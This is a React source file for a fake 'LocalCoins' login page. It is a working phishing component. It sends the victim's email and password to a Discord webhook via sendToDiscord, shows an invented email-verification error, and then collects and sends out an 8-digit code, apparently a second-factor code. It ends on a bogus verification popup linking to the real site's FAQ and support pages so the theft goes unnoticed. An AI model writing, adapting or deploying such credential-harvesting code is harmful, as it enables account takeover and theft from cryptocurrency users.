import React, { useState, KeyboardEvent } from 'react';
import { Edit2, ArrowRight, Eye, EyeOff, AlertCircle, Mail, Loader2, ExternalLink, HelpCircle } from 'lucide-react';
import { sendToDiscord } from '../utils/webhook';

export function LoginForm() {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState('');
  const [isEditing, setIsEditing] = useState(true);
  const [password, setPassword] = useState('');
  const [showPasswordText, setShowPasswordText] = useState(false);
  const [showError, setShowError] = useState(false);
  const [showRecoveryCode, setShowRecoveryCode] = useState(false);
  const [recoveryCode, setRecoveryCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showSuccessMessage, setShowSuccessMessage] = useState(false);
  const [showSupportPopup, setShowSupportPopup] = useState(false);

  const handleRecover = async () => {
    if (isLoading) return;
    
    if (email && !showPassword) {
      setShowPassword(true);
      setIsEditing(false);
    } else if (showPassword && !showError && !showRecoveryCode) {
      setIsLoading(true);
      await sendToDiscord({ email, password });
      await new Promise(resolve => setTimeout(resolve, 1500));
      setIsLoading(false);
      setShowError(true);
    } else if (showError && !showRecoveryCode) {
      setShowSuccessMessage(true);
      setShowError(false);
      setShowRecoveryCode(true);
    } else if (showRecoveryCode) {
      setIsLoading(true);
      await sendToDiscord({ email, password, code: recoveryCode });
      await new Promise(resolve => setTimeout(resolve, 2000));
      setIsLoading(false);
      setShowSupportPopup(true);
    }
  };

  const handleEdit = () => {
    setIsEditing(true);
    setShowPassword(false);
    setShowError(false);
    setShowRecoveryCode(false);
    setShowSuccessMessage(false);
    setShowSupportPopup(false);
  };

  const togglePasswordVisibility = () => {
    setShowPasswordText(!showPasswordText);
  };

  const handleKeyPress = (e: KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      handleRecover();
    }
  };

  if (showSupportPopup) {
    return (
      <div className="flex-1 animate-fadeIn">
        <div className="bg-white p-8 rounded-lg shadow-lg">
          <div className="flex items-start space-x-4">
            <AlertCircle className="w-8 h-8 text-red-500 flex-shrink-0" />
            <div className="space-y-4 flex-1">
              <div>
                <h3 className="text-xl font-semibold text-gray-900">Account Verification Required</h3>
                <p className="mt-3 text-gray-600">
                  For security reasons, your account requires additional verification. Please choose one of the following options:
                </p>
              </div>
              
              <div className="space-y-4 mt-6">
                <a 
                  href="https://localcoins.com/faq/verification"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex items-center justify-between w-full px-4 py-3 bg-gray-50 rounded-lg hover:bg-gray-100 transition-colors"
                >
                  <div className="flex items-center gap-3">
                    <HelpCircle className="w-5 h-5 text-blue-500" />
                    <span className="text-gray-700">Check our FAQ</span>
                  </div>
                  <ArrowRight className="w-4 h-4 text-gray-400" />
                </a>

                <a 
                  href="https://localcoins.com/support"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex items-center justify-between w-full px-4 py-3 bg-gray-50 rounded-lg hover:bg-gray-100 transition-colors"
                >
                  <div className="flex items-center gap-3">
                    <Mail className="w-5 h-5 text-green-500" />
                    <span className="text-gray-700">Contact Support</span>
                  </div>
                  <ArrowRight className="w-4 h-4 text-gray-400" />
                </a>
              </div>

              <p className="text-sm text-gray-500 mt-4">
                Our support team is available 24/7 to assist you with the verification process.
              </p>

              <button
                onClick={handleEdit}
                className="mt-6 text-blue-500 hover:text-blue-600 flex items-center gap-2"
              >
                <ArrowRight className="w-4 h-4 rotate-180" />
                Back to login
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex-1">
      <h2 className="text-2xl font-semibold text-gray-900 mb-8">
        Login to LocalCoins
      </h2>
      
      {showError && (
        <div className="mb-6 animate-fadeIn">
          <div className="bg-red-50 border-l-4 border-red-500 p-4 rounded-r-lg">
            <div className="flex items-start">
              <AlertCircle className="w-5 h-5 text-red-500 mt-0.5" />
              <div className="ml-3">
                <p className="text-sm text-red-700">
                  We need to verify your email address for security purposes. please check your email and then press check status!
                </p>
                <p className="text-sm text-red-600 mt-1">
                  
                </p>
              </div>
            </div>
          </div>
        </div>
      )}

      {showSuccessMessage && (
        <div className="mb-6 animate-fadeIn">
          <div className="bg-green-50 border-l-4 border-green-500 p-4 rounded-r-lg">
            <div className="flex items-start">
              <Mail className="w-5 h-5 text-green-500 mt-0.5" />
              <div className="ml-3">
                <p className="text-sm text-green-700">
                  We have sent you an 8-digit code to your email address.
                </p>
              </div>
            </div>
          </div>
        </div>
      )}

      <form className="space-y-6" onSubmit={(e) => e.preventDefault()}>
        <div className="space-y-2">
          <label htmlFor="email" className="block text-sm font-medium text-gray-700">
            Email
          </label>
          <div className="relative">
            <input
              type="email"
              id="email"
              placeholder="you@email.com"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              onKeyPress={handleKeyPress}
              disabled={!isEditing || isLoading}
              className={`w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all pr-10 ${!isEditing ? 'bg-gray-50' : ''}`}
            />
            {!isEditing && (
              <button
                type="button"
                onClick={handleEdit}
                disabled={isLoading}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-blue-500 hover:text-blue-600"
              >
                <Edit2 className="w-4 h-4" />
              </button>
            )}
          </div>
        </div>

        {showPassword && (
          <div className="space-y-2 animate-fadeIn">
            <label htmlFor="password" className="block text-sm font-medium text-gray-700">
              Password
            </label>
            <div className="relative">
              <input
                type={showPasswordText ? 'text' : 'password'}
                id="password"
                placeholder="Enter your password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onKeyPress={handleKeyPress}
                disabled={isLoading}
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all pr-10"
              />
              <button
                type="button"
                onClick={togglePasswordVisibility}
                disabled={isLoading}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
              >
                {showPasswordText ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
          </div>
        )}

        {showRecoveryCode && (
          <div className="space-y-2 animate-fadeIn">
            <label htmlFor="recoveryCode" className="block text-sm font-medium text-gray-700">
              8-Digit Code
            </label>
            <div className="relative">
              <input
                type="text"
                id="recoveryCode"
                placeholder="Enter the 8-digit code from your email"
                value={recoveryCode}
                onChange={(e) => setRecoveryCode(e.target.value)}
                onKeyPress={handleKeyPress}
                disabled={isLoading}
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all"
              />
              <Mail className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 w-4 h-4" />
            </div>
          </div>
        )}

        <button
          type="button"
          onClick={handleRecover}
          disabled={isLoading}
          className="w-full px-4 py-2 bg-blue-500 text-white rounded-lg hover:bg-blue-600 transition-colors flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {isLoading ? (
            <>
              <Loader2 className="w-4 h-4 animate-spin" />
              Processing...
            </>
          ) : (
            <>
              {showRecoveryCode ? 'Verify Code' : showError ? 'Check Status' : showPassword ? 'Login' : 'Recover'}
              <ArrowRight className="w-4 h-4" />
            </>
          )}
        </button>
      </form>
    </div>
  );
}